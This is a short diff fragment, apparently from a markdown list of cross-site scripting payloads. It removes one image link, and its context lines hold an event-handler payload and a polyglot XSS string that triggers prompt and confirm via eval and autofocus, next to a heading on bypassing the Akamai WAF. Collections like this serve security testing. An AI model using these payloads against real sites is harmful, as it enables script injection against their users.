@@ -131,7 +131,6 @@ OnMoUsEoVeR=prompt(/hacked/)//
 ```js
 xhzeem*/eval?.(value+/()/.source)//"><input value=confirm autofocus onfocus='/*"
 ```
-![img](https://pbs.twimg.com/media/EyDDoO7WYAEJMr6?format=jpg&name=small)
 
 Limited case Akamai WAF bypass
 ```js
